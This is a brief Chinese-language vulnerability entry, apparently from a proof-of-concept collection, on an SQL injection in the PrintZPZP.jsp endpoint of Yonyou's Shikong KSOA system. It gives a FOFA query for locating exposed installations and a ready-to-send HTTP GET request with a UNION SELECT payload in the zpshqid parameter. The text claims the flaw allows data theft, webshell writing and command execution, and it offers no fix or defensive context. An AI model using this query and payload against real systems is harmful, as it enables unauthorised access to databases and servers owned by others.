# 用友时空KSOA系统接口PrintZPZP.jsp存在SQL注入漏洞

用友时空KSOA接口 `/kp//PrintZPZP.jsp` 接口存在SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

## fofa

```yaml
app="用友-时空KSOA"
```

## poc

```yaml
GET /kp/PrintZPZP.jsp?zpshqid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13+--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
Connection: close
```

